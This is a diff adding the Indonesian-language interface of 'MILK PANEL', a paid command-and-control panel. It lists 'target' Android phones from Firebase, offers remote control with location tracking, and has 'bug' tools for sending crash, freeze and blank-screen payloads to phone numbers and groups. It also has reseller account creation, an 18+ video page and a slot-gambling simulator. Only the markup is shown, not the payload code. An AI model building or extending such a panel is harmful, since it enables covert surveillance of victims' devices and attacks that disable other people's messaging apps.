+    <button class="menu-btn buy" onclick="openBuyAccess()">BUY ACCESS</button>
+    <button class="menu-btn group" onclick="openGroupDev()">GROUP DEV</button>
+  </div>
+</div>
+
+<div id="videoIntro" class="screen">
+  <video id="introVid" autoplay muted playsinline onended="finishVideoIntro()">
+    <source src="https://files.catbox.moe/wru2tc.mp4" type="video/mp4">
+  </video>
+  <div class="video-overlay-content">
+    <div class="text-3d-effect">MILK PANEL</div>
+    <div class="loading-bar-container"><div class="loading-bar-fill"></div></div>
+    <div class="mbweh-text">Mbweh Crash</div>
+  </div>
+  <button class="skip-btn" onclick="finishVideoIntro()">
+    Skip
+    <svg style="width:12px;height:12px;fill:currentColor" viewBox="0 0 24 24"><path d="M5 3l3.057-3 11.943 12-11.943 12-3.057-3 9-9z"/></svg>
+  </button>
+</div>
+
+<div id="login" class="screen">
+  <div class="card-3d">
+    <div class="logo-mini"></div>
+    <div class="card-title">Masuk</div>
+    <div class="card-sub">Devolver BetranJunior</div>
+    <div class="field"><label>Username</label><input type="text" id="user" placeholder="Username"></div>
+    <div class="field"><label>Password</label><input type="password" id="pass" placeholder="••••"></div>
+    <button class="btn-primary" onclick="doLogin(false)">Login</button>
+    <div class="login-error" id="loginErr"></div>
+  </div>
+</div>
+
+<div id="main" class="screen">
+  <div class="topbar">
+    <h1 id="pageTitle">Dashboard</h1>
+    <span class="badge-premium" id="badgeDeviceType">PREMIUM</span>
+  </div>
+  <div class="content">
+    
+    <div id="frag-home" class="fragment active">
+      <!-- STORY TRAY DI HOME DENGAN TOMBOL BUAT STORY DI DEKATNYA -->
+      <div class="home-widget" style="padding:12px 14px;">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px;">
+          <h4 style="margin:0;">Story Pengguna</h4>
+          <button onclick="openStoryModal()" style="background:var(--accent-deep);color:#fff;border:none;padding:4px 10px;border-radius:10px;font-size:11px;font-weight:700;cursor:pointer;">+ Buat Story</button>
+        </div>
+        <div class="story-tray" id="homeStoryTray">
+          <div style="font-size:12px;color:var(--text-soft);padding:6px">Belum ada story. Buat story baru sekarang!</div>
+        </div>
+      </div>
+
+      <div class="premium-clock-widget">
+        <div class="clock-top">
+          <span class="clock-badge">
+            <svg style="width:10px;height:10px;fill:#fff;vertical-align:middle;margin-right:2px" viewBox="0 0 24 24"><path d="M12 .587l3.668 7.431 8.212 1.193-5.94 5.787 1.401 8.168-7.341-3.861-7.341 3.861 1.401-8.168-5.94-5.787 8.212-1.193z"/></svg>
+            LIVE PREMIUM TIME
+          </span>
+          <span class="clock-date" id="liveDateText">Memuat tanggal...</span>
+        </div>
+        <div class="clock-time" id="liveClockText">00:00:00</div>
+        <div class="clock-footer">
+          <span id="liveCountdownText">Masa Aktif: Memuat...</span>
+          <span style="color:#ffd700">● SECURE C2</span>
+        </div>
+      </div>
+
+      <div class="status-row">
+        <div class="status-pill"><div class="num" id="statOnline">0</div><div class="lbl">Online Pengguna</div></div>
+        <div class="status-pill"><div class="num" id="statIdle">0</div><div class="lbl">Offline</div></div>
+        <div class="status-pill"><div class="num" id="statTotal">1</div><div class="lbl">Total Device</div></div>
+      </div>
+
+      <!-- BUG TOOLS PREMIUM -->
+      <div class="home-widget">
+        <h4>Bug Tools Premium</h4>
+        <div class="bug-action-row">
+          <button class="bug-action-btn nomor" onclick="prepareBug('nomor')">BUG NOMOR</button>
+          <button class="bug-action-btn grup" onclick="prepareBug('grup')">BUG GRUP</button>
+        </div>
+
+        <div style="font-size:12px;font-weight:600;color:var(--text-soft);margin:8px 0 6px">Pilih Payload</div>
+        <div class="payload-swipe" id="payloadSwipe">
+          <div class="payload-card active" data-payload="crash-v1" onclick="selectPayload(this)">
+            <div class="payload-img" style="background:linear-gradient(135deg,#2a1a1a,#5a2a2a)">CRASH<br>V1</div>
+            <div class="payload-label">Force Close</div>
+          </div>
+          <div class="payload-card" data-payload="blank-screen" onclick="selectPayload(this)">
+            <div class="payload-img" style="background:linear-gradient(135deg,#1a1a2a,#2a2a5a)">BLANK<br>SCREEN</div>
+            <div class="payload-label">Layar Hitam</div>
+          </div>
+          <div class="payload-card" data-payload="spam-dialog" onclick="selectPayload(this)">
+            <div class="payload-img" style="background:linear-gradient(135deg,#1a2a1a,#2a5a2a)">SPAM<br>DIALOG</div>
+            <div class="payload-label">Popup Loop</div>
+          </div>
+          <div class="payload-card" data-payload="freeze" onclick="selectPayload(this)">
+            <div class="payload-img" style="background:linear-gradient(135deg,#2a2a2a,#5a2a5a)">FREEZE<br>UI</div>
+            <div class="payload-label">UI Freeze</div>
+          </div>
+          <div class="payload-card" data-payload="reboot" onclick="selectPayload(this)">
+            <div class="payload-img" style="background:linear-gradient(135deg,#1a2a1a,#5a2a5a)">SOFT<br>REBOOT</div>
+            <div class="payload-label">Restart Soft</div>
+          </div>
+        </div>
+
+        <button class="add-sender-btn" onclick="openAddSender()">+ ADD SENDER</button>
+        <div class="sender-list" id="senderListDisplay">Belum ada sender ditambahkan</div>
+      </div>
+
+      <div class="home-widget">
+        <h4>
+          <svg style="width:14px;height:14px;fill:var(--accent-deep);vertical-align:middle;margin-right:4px" viewBox="0 0 24 24"><path d="M15 1H9v2h6V1zm-4 13h2V8h-2v6zm8.03-6.61l1.42-1.42c-.43-.51-.9-.99-1.41-1.41l-1.42 1.42C16.07 4.74 14.12 4 12 4c-4.97 0-9 4.03-9 9s4.03 9 9 9 9-4.03 9-9c0-2.12-.74-4.07-1.97-5.61zM12 20c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7 z"/></svg>
+          Masa Aktif Akun (Time Habis)
+        </h4>
+        <p id="homeAccountTime">Memuat informasi akun...</p>
+      </div>
+
+      <div class="home-widget">
+        <h4>
+          <svg style="width:14px;height:14px;fill:var(--accent-deep);vertical-align:middle;margin-right:4px" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+          Info Sepak Bola 24 Jam Terupdate
+        </h4>
+        <div class="swipe-track">
+          <div class="swipe-item"><div class="si-title">Barcelona vs Real Madrid</div><div class="si-desc">El Clasico malam ini pukul 02:00 WIB di La Liga.</div></div>
+          <div class="swipe-item"><div class="si-title">Manchester United</div><div class="si-desc">Siap datangkan striker bintang di bursa transfer musim dingin.</div></div>
+          <div class="swipe-item"><div class="si-title">Arsenal vs Man City</div><div class="si-desc">Puncak klasemen Liga Inggris memanas pekan ini.</div></div>
+          <div class="swipe-item"><div class="si-title">Bayern Munchen</div><div class="si-desc">Menang telak 4-0 di ajang Liga Champions UEFA.</div></div>
+          <div class="swipe-item"><div class="si-title">AC Milan vs Inter Milan</div><div class="si-desc">Derby della Madonnina sarat gengsi akhir pekan ini.</div></div>
+        </div>
+      </div>
+
+      <div class="home-widget">
+        <h4>
+          <svg style="width:14px;height:14px;fill:var(--accent-deep);vertical-align:middle;margin-right:4px" viewBox="0 0 24 24"><path d="M12 3L2 12h3v8h14v-8h3L12 3zm0 3.7c1.48 0 2.7 1.22 2.7 2.7 0 1.48-1.22 2.7-2.7 2.7-1.48 0-2.7-1.22-2.7-2.7 0-1.48 1.22-2.7 2.7-2.7zm0 10.3c-2.03 0-3.83-.98-4.93-2.5 1.07-1.12 2.84-1.8 4.93-1.8s3.86.68 4.93 1.8c-1.1 1.52-2.9 2.5-4.93 2.5z"/></svg>
+          Jadwal Sholat Hari Ini
+        </h4>
+        <div class="sholat-mini-grid">
+          <div class="sholat-pill"><div class="sp-name">Subuh</div><div class="sp-time">04:42</div></div>
+          <div class="sholat-pill"><div class="sp-name">Dzuhur</div><div class="sp-time">11:52</div></div>
+          <div class="sholat-pill" style="background:var(--accent);color:#fff"><div class="sp-name" style="color:#fff">Ashar</div><div class="sp-time">15:14</div></div>
+          <div class="sholat-pill"><div class="sp-name">Maghrib</div><div class="sp-time">17:58</div></div>
+          <div class="sholat-pill"><div class="sp-name">Isya</div><div class="sp-time">19:10</div></div>
+        </div>
+      </div>
+
+      <div class="home-widget">
+        <h4>
+          <svg style="width:14px;height:14px;fill:var(--accent-deep);vertical-align:middle;margin-right:4px" viewBox="0 0 24 24"><path d="M20 3H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H4V5h16v14zM6 7h5v2H6V7zm0 4h12v2H6v-2zm0 4h12v2H6v-2z"/></svg>
+          Berita & Info Sistem (10 Update)
+        </h4>
+        <div class="swipe-track">
+          <div class="swipe-item"><div class="si-title">1. Keamanan C2</div><div class="si-desc">Enkripsi database real-time diperbarui otomatis.</div></div>
+          <div class="swipe-item"><div class="si-title">2. Teknologi AI</div><div class="si-desc">Perangkat Target mendeteksi aktivitas latar belakang stabil.</div></div>
+          <div class="swipe-item"><div class="si-title">3. Tren Global</div><div class="si-desc">Pembaruan protokol enkripsi pesan global sukses.</div></div>
+          <div class="swipe-item"><div class="si-title">4. Jaringan 5G</div><div class="si-desc">Optimalisasi kecepatan kontrol jarak jauh meningkat 50%.</div></div>
+          <div class="swipe-item"><div class="si-title">5. Efisiensi Baterai</div><div class="si-desc">Mode hemat daya aktif otomatis saat idle.</div></div>
+          <div class="swipe-item"><div class="si-title">6. Update Android</div><div class="si-desc">Kompatibilitas penuh hingga versi Android 15.</div></div>
+          <div class="swipe-item"><div class="si-title">7. Sinyal GPS</div><div class="si-desc">Akurasi pelacakan lokasi kini menggunakan multi-satelit.</div></div>
+          <div class="swipe-item"><div class="si-title">8. Panel Kontrol</div><div class="si-desc">Penambahan fitur kustomisasi tema visual baru.</div></div>
+          <div class="swipe-item"><div class="si-title">9. Privasi Data</div><div class="si-desc">Sistem penyimpanan lokal terisolasi dengan aman.</div></div>
+          <div class="swipe-item"><div class="si-title">10. Server Status</div><div class="si-desc">Koneksi stabil tanpa gangguan latensi tinggi.</div></div>
+        </div>
+      </div>
+
+      <div class="section-title">Status Perangkat Terhubung</div>
+      <div id="homeDeviceCard"></div>
+    </div>
+
+    <div id="frag-devices" class="fragment">
+      <div class="section-title">
+        <span>Perangkat Target</span>
+        <button class="btn-refresh" onclick="forceRefresh()">↻ Refresh</button>
+      </div>
+      <div id="deviceList"></div>
+      <div class="debug-box" id="debugInfo">Menunggu data Firebase...</div>
+    </div>
+
+    <!-- FRAGMENT TOOLS -->
+    <div id="frag-tools" class="fragment">
+      <div class="section-title">Tools Tambahan Premium</div>
+      <div class="tools-grid-mini">
+        <div class="tool-card-mini" onclick="openMusicPlayer()">
+          <div class="tool-mini-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
+          </div>
+          <div class="t-title">Musik</div>
+          <div class="t-desc">Streaming & Audio</div>
+        </div>
+
+        <div class="tool-card-mini" onclick="openBokepPage()">
+          <div class="tool-mini-icon">
+            <svg viewBox="0 0 24 24"><path d="M18 3v2h-2V3H8v2H6V3H4v18h2v-2h2v2h8v-2h2v2h2V3h-2zM8 17H6v-2h2v2zm0-4H6v-2h2v2zm0-4H6V7h2v2zm6 8h-4v-2h4v2zm0-4h-4v-2h4v2zm0-4h-4V7h4v2zm4 8h-2v-2h2v2zm0-4h-2v-2h2v2zm0-4h-2V7h2v2z"/></svg>
+          </div>
+          <div class="t-title">Bokep</div>
+          <div class="t-desc">Video Hiburan 18+</div>
+        </div>
+
+        <div class="tool-card-mini" onclick="openTikTokDownloader()">
+          <div class="tool-mini-icon">
+            <svg viewBox="0 0 24 24"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM17 13l-5 5-5-5h3V9h4v4h3z"/></svg>
+          </div>
+          <div class="t-title">TikTok HD</div>
+          <div class="t-desc">Download MP4 TikTok</div>
+        </div>
+
+        <div class="tool-card-mini" onclick="openStreamBolaPage()">
+          <div class="tool-mini-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+          </div>
+          <div class="t-title">Stream Bola</div>
+          <div class="t-desc">Live Pertandingan</div>
+        </div>
+
+        <div class="tool-card-mini" onclick="openSlotPage()">
+          <div class="tool-mini-icon">
+            <svg viewBox="0 0 24 24"><path d="M20 6h-2.18c.11-.31.18-.65.18-1 0-1.66-1.34-3-3-3-1.05 0-1.96.54-2.5 1.35l-.5.67-.5-.68C10.96 2.54 10.05 2 9 2 7.34 2 6 3.34 6 5c0 .35.07.69.18 1H4c-1.1 0-1.99.9-1.99 2L2 19c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-5-2c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zM9 4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm11 15H4v-2h16v2zm0-5H4V8h5.08L7 10.83 8.62 12 11 8.76l1-1.33 1 1.33L15.38 12 17 10.83 14.92 8H20v6z"/></svg>
+          </div>
+          <div class="t-title">Slot Games</div>
+          <div class="t-desc">Simulasi Gacor & VIP</div>
+        </div>
+
+        <!-- TOMBOL KE 6: CREATE USER (Hanya muncul untuk Admin & Reseller) -->
+        <div class="tool-card-mini" id="toolCardCreateUser" style="display:none;" onclick="openCreateUserPage()">
+          <div class="tool-mini-icon">
+            <svg viewBox="0 0 24 24"><path d="M15 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm-9-2V7H4v3H1v2h3v3h2v-3h3v-2H6zm9 4c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+          </div>
+          <div class="t-title">Create User</div>
+          <div class="t-desc">Buat Akun & Perangkat</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- HALAMAN KHUSUS CREATE USER -->
+    <div id="frag-create-user" class="fragment">
+      <div class="ctrl-header">
+        <button class="back" onclick="switchFrag('tools', document.querySelector('[data-frag=\'tools\']'))">
+          <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        </button>
+        <div class="dev-info">
+          <div class="dev-name">Create User & Password</div>
+          <div class="dev-meta">Atur masa aktif & generate ID kontrol</div>
+        </div>
+      </div>
+      <div class="home-widget">
+        <h4>👑 Form Buat Akun Baru</h4>
+        <p style="margin-bottom:12px">Isi data akun Anda / member di bawah ini.</p>
+        
+        <div class="field">
+          <label>Username Baru</label>
+          <input type="text" id="newUsernameInput" placeholder="Cth: Target01">
+        </div>
+        <div class="field">
+          <label>Password Baru</label>
+          <input type="text" id="newPasswordInput" placeholder="Cth: pass123">
+        </div>
+        <div class="field">
+          <label>ID Perangkat Target (Acak)</label>
+          <div style="display:flex;gap:8px">
+            <input type="text" id="newDeviceIdInput" readonly style="flex:1;background:var(--milk-deep);font-weight:bold">
+            <button class="btn-refresh" onclick="generateRandomDeviceId()" style="padding:0 14px">Acak ID</button>
+          </div>
+        </div>
+        <div class="field" id="roleSelectionField">
+          <label>Role Akun</label>
+          <button class="custom-picker-btn" id="btnPickerRole" onclick="openPickerModal('role')">
+            <span id="selectedRoleText">Member</span>
+            <svg style="width:16px;height:16px;fill:var(--text-soft)" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+          </button>
+        </div>
+        <div class="field">
+          <label>Masa Aktif Tanggal Perangkat</label>
+          <button class="custom-picker-btn" id="btnPickerDuration" onclick="openPickerModal('duration')">
+            <span id="selectedDurationText">30 Hari (1 Bulan)</span>
+            <svg style="width:16px;height:16px;fill:var(--text-soft)" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+          </button>
+        </div>
+        <button class="btn-primary" onclick="submitCreateUser()">Simpan Akun Baru</button>
+        <div id="resellerQuotaInfo" style="font-size:11px;color:var(--text-soft);margin-top:8px;text-align:center"></div>
+      </div>
+    </div>
+
+    <!-- HALAMAN KHUSUS BOKEP -->
+    <div id="frag-bokep" class="fragment">
+      <div class="ctrl-header">
+        <button class="back" onclick="switchFrag('tools', document.querySelector('[data-frag=\'tools\']'))">
+          <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        </button>
+        <div class="dev-info">
+          <div class="dev-name">Koleksi Video Eksklusif 18+</div>
+          <div class="dev-meta">Streaming HD Tanpa Iklan</div>
+        </div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:12px;">
+        <div class="home-widget" style="padding:12px;">
+          <h4 style="margin-bottom:8px">Video Premium 1</h4>
+          <div style="width:100%;height:180px;background:#000;border-radius:12px;overflow:hidden">
+            <video controls width="100%" height="100%" style="object-fit:cover" preload="none" poster="https://via.placeholder.com/400x200/111/fff?text=VIP+Video+1">
+              <source src="https://files.catbox.moe/wru2tc.mp4" type="video/mp4">
+            </video>
+          </div>
+        </div>
+        <div class="home-widget" style="padding:12px;">
+          <h4 style="margin-bottom:8px">Video Premium 2</h4>
+          <div style="width:100%;height:180px;background:#000;border-radius:12px;overflow:hidden">
+            <video controls width="100%" height="100%" style="object-fit:cover" preload="none" poster="https://via.placeholder.com/400x200/222/fff?text=VIP+Video+2">
+              <source src="https://files.catbox.moe/4f0vuz.mp3" type="video/mp4">
+            </video>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- HALAMAN DOWNLOAD TIKTOK MP4 -->
+    <div id="frag-tiktok" class="fragment">
+      <div class="ctrl-header">
+        <button class="back" onclick="switchFrag('tools', document.querySelector('[data-frag=\'tools\']'))">
+          <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        </button>
+        <div class="dev-info">
+          <div class="dev-name">TikTok HD Downloader</div>
+          <div class="dev-meta">Tanpa Watermark & Resolusi Tinggi</div>
+        </div>
+      </div>
+      <div class="home-widget">
+        <h4>Masukkan Link Video TikTok</h4>
+        <div class="field" style="margin-top:10px">
+          <input type="text" id="tiktokUrlInput" placeholder="https://v.tiktok.com/..." style="font-size:13px">
+        </div>
+        <button class="btn-primary" onclick="processTikTokDownload()">Download MP4 HD</button>
+        <div id="tiktokResultArea" style="margin-top:14px;display:none;text-align:center">
+          <p style="font-size:13px;color:var(--text);margin-bottom:8px">Berhasil diproses!</p>
+          <a id="tiktokDownloadLink" href="#" target="_blank" class="btn-primary" style="display:block;text-decoration:none;text-align:center">Unduh Video Sekarang</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- HALAMAN STREAMING BOLA -->
+    <div id="frag-streambola" class="fragment">
+      <div class="ctrl-header">
+        <button class="back" onclick="switchFrag('tools', document.querySelector('[data-frag=\'tools\']'))">
+          <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        </button>
+        <div class="dev-info">
+          <div class="dev-name">Live Streaming Bola 24 Jam</div>
+          <div class="dev-meta">Pertandingan Pilihan HD</div>
+        </div>
+      </div>
+      <div class="home-widget">
+        <h4>Sedang Live: Barcelona vs Real Madrid</h4>
+        <div style="width:100%;height:200px;background:#000;border-radius:12px;overflow:hidden;margin-top:10px">
+          <video controls autoplay muted width="100%" height="100%" style="object-fit:cover">
+            <source src="https://files.catbox.moe/wru2tc.mp4" type="video/mp4">
+          </video>
+        </div>
+        <p style="font-size:11px;color:var(--text-soft);margin-top:8px">Koneksi Server: Stabil (60 FPS / HD)</p>
+      </div>
+    </div>
+
+    <!-- HALAMAN SLOT GAME PG SOFT -->
+    <div id="frag-slot" class="fragment">
+      <div class="ctrl-header">
+        <button class="back" onclick="switchFrag('tools', document.querySelector('[data-frag=\'tools\']'))">
+          <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        </button>
+        <div class="dev-info">
+          <div class="dev-name">PG Soft Official Slot Simulator</div>
+          <div class="dev-meta">Mahjong Ways · Gacor RTP 98.5%</div>
+        </div>
+      </div>
+      <div class="home-widget" style="text-align:center;padding:20px;">
+        <div style="background:var(--milk-deep);padding:12px;border-radius:14px;margin-bottom:14px">
+          <div style="font-size:12px;color:var(--text-soft)">SALDO AKUN ANDA</div>
+          <div id="slotBalance" style="font-size:24px;font-weight:900;color:var(--accent-deep)">Rp 1.000.000</div>
+        </div>
+        
+        <div style="width:100%;height:150px;background:linear-gradient(135deg,#1e1a17,#3a322c);border-radius:16px;display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:16px;box-shadow:inset 0 0 20px rgba(0,0,0,0.5)">
+          <div id="reel1" style="font-size:36px;background:var(--cream);padding:12px 18px;border-radius:10px"> </div>
+          <div id="reel2" style="font-size:36px;background:var(--cream);padding:12px 18px;border-radius:10px"> </div>
+          <div id="reel3" style="font-size:36px;background:var(--cream);padding:12px 18px;border-radius:10px"> </div>
+        </div>
+
+        <div class="field" style="margin-bottom:10px">
+          <label>Nilai Taruhan (Bet)</label>
+          <button class="custom-picker-btn" id="btnPickerBet" onclick="openPickerModal('bet')">
+            <span id="selectedBetText">Rp 10.000</span>
+            <svg style="width:16px;height:16px;fill:var(--text-soft)" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+          </button>
+        </div>
+
+        <button class="btn-primary" onclick="spinSlotMachine()" style="background:linear-gradient(145deg,#e07a6a,#c45c4a)">SPIN SEKARANG</button>
+      </div>
+    </div>
+
+    <!-- FRAGMENT MUSIC PLAYER -->
+    <div id="frag-music-player" class="fragment">
+      <div class="ctrl-header">
+        <button class="back" onclick="switchFrag('tools', document.querySelector('[data-frag=\'tools\']'))">
+          <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        </button>
+        <div class="dev-info">
+          <div class="dev-name">Pemutar Musik Premium</div>
+          <div class="dev-meta">9 Koleksi Lagu Pilihan</div>
+        </div>
+        <button class="btn-refresh" onclick="stopAllMusic()" style="background:#b85c4a;color:#fff">Stop</button>
+      </div>
+      <div id="musicListContainer"></div>
+    </div>
+
+    <div id="frag-chat" class="fragment">
+      <div class="section-title">Global Chat & WhatsApp Voice Note</div>
+      <div class="chat-container">
+        <div class="chat-messages" id="chatMessagesBox"></div>
+        <div class="chat-input-box">
+          <input type="text" id="chatInputText" placeholder="Ketik pesan..." onkeydown="if(event.key==='Enter')sendGlobalChat()">
+          <button class="chat-story-btn" onclick="openStoryModal()" title="Buat Story Baru">
+            <svg style="width:16px;height:16px;fill:#fff" viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2 10h-4v4h-2v-4H7v-2h4V7h2v4h4v2z"/></svg>
+          </button>
+          <button class="chat-vn-btn" id="btnRecordVn" onclick="toggleRecordVN()" title="Tekan untuk Rekam VN">
+            <svg style="width:18px;height:18px;fill:#fff" viewBox="0 0 24 24"><path d="M12 14c1.66 0 3-1.34 3-3V5c0-1.66-1.34-3-3-3S9 3.34 9 5v6c0 1.66 1.34 3 3 3zm-1-9c0-.55.45-1 1-1s1 .45 1 1v6c0 .55-.45 1-1 1s-1-.45-1-1V5zm6 6c0 2.76-2.24 5-5 5s-5-2.24-5-5H5c0 3.53 2.61 6.43 6 6.92V21h2v-3.08c3.39-.49 6-3.39 6-6.92h-2z"/></svg>
+          </button>
+          <!-- TOMBOL KIRIM FOTO DI CHAT GLOBAL -->
+          <button class="chat-story-btn" style="background:linear-gradient(145deg,#27ae60,#2ecc71)" onclick="document.getElementById('chatPhotoInput').click()" title="Kirim Foto">
+            <svg style="width:16px;height:16px;fill:#fff" viewBox="0 0 24 24"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
+          </button>
+          <input type="file" id="chatPhotoInput" accept="image/*" style="display:none" onchange="sendChatPhoto(this)">
+          
+          <button class="chat-send-btn" onclick="sendGlobalChat()">Kirim</button>
+        </div>
+      </div>
+    </div>
+
+    <div id="frag-settings" class="fragment">
+      <div class="tiktok-profile-card">
+        <div class="tiktok-avatar-container" onclick="document.getElementById('profileImgInput').click()" title="Ganti Foto Profil">
+          <img id="tiktokProfileImg" class="tiktok-avatar" src="https://via.placeholder.com/90" alt="Avatar">
+          <div class="tiktok-avatar-badge">
+            <svg style="width:12px;height:12px;fill:#fff" viewBox="0 0 24 24"><path d="M4 4h3l2-2h6l2 2h3c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2zm8 3c-2.76 0-5 2.24-5 5s2.24 5 5 5 5-2.24 5-5-2.24-5-5-5zm0 2c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3z"/></svg>
+          </div>
+        </div>
+        <div class="tiktok-username" id="tiktokUsernameDisplay">Admin <span id="profileVerifiedBadge"></span></div>
+        <div class="tiktok-handle" id="tiktokHandleDisplay">@milk_panel_vip</div>
+        
+        <div class="tiktok-stats-row">
+          <div class="tiktok-stat-item">
+            <div class="stat-num" id="statActiveDays">30</div>
+            <div class="stat-label">Hari Aktif</div>
+          </div>
+          <div class="tiktok-stat-item">
+            <div class="stat-num" id="currentUserRoleDisplay">VIP</div>
+            <div class="stat-label">Role Akun</div>
+          </div>
+          <div class="tiktok-stat-item">
+            <div class="stat-num" id="statDeviceIdDisplay">8543</div>
+            <div class="stat-label">Target ID</div>
+          </div>
+        </div>
+
+        <button class="tiktok-bio-btn" onclick="document.getElementById('profileImgInput').click()">Ubah Foto Profil</button>
+        <input type="file" id="profileImgInput" accept="image/*" style="display:none" onchange="uploadProfileImage(this)">
+      </div>
+
+      <div class="section-title">Pilih Tema</div>
+      <div class="theme-swipe-container">
+        <div class="theme-swipe-track">
+          <div class="theme-card-swipe active" id="theme-milk" onclick="setTheme('milk')"><div class="theme-img-preview" style="background:linear-gradient(135deg,#f8f4ef,#c4a484)"></div><div class="label">Milk</div></div>
+          <div class="theme-card-swipe" id="theme-dark" onclick="setTheme('dark')"><div class="theme-img-preview" style="background:linear-gradient(135deg,#2a2420,#1e1a17)"></div><div class="label">Dark</div></div>
+          <div class="theme-card-swipe" id="theme-rose" onclick="setTheme('rose')"><div class="theme-img-preview" style="background:linear-gradient(135deg,#fdf2f4,#d4a0b0)"></div><div class="label">Rose</div></div>
+          <div class="theme-card-swipe" id="theme-purple" onclick="setTheme('purple')"><div class="theme-img-preview" style="background:linear-gradient(135deg,#f3eafd,#a884d4)"></div><div class="label">Ungu</div></div>
+          <div class="theme-card-swipe" id="theme-ocean" onclick="setTheme('ocean')"><div class="theme-img-preview" style="background:linear-gradient(135deg,#eaeeef,#84b8d4)"></div><div class="label">Ocean</div></div>
+        </div>
+      </div>
+      <div class="section-title">Info Server</div>
+      <div class="list-card"><div class="info"><div class="name">C2 Host</div><div class="meta" id="currentHostMeta">device_status @ Firebase</div></div></div>
+      <div class="section-title">Keluar</div>
+      <div class="list-card" onclick="logout()" style="cursor:pointer"><div class="info"><div class="name" style="color:#b85c4a">Logout</div><div class="meta">Keluar dari sesi ini</div></div></div>
+    </div>
+
+    <div id="frag-control" class="fragment">
+      <div class="ctrl-header">
+        <button class="back" onclick="closeControl()">
+          <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+        </button>
+        <div class="dev-info">
+          <div class="dev-name" id="ctrlName">HP Target Target</div>
+          <div class="dev-meta" id="ctrlMeta">Android · Sesi Unik</div>
+        </div>
+      </div>
+      <div class="ctrl-status">
+        <div class="pill"><b id="ctrlBatt">—</b>Battery</div>
+        <div class="pill"><b id="ctrlNet">—</b>Network</div>
+        <div class="pill"><b id="ctrlStatusText" style="color:#e74c3c">Offline</b>Status</div>
+      </div>
+      <div class="section-title">Kontrol HP TARGET (10 Fitur Lengkap)</div>
+      <div id="toolList"></div>
+    </div>
+
+  </div>
+
+  <nav class="bottom-nav" id="bottomNav">
+    <button class="nav-item active" data-frag="home" onclick="switchFrag('home',this)"><div class="icon"><svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg></div>Home</button>
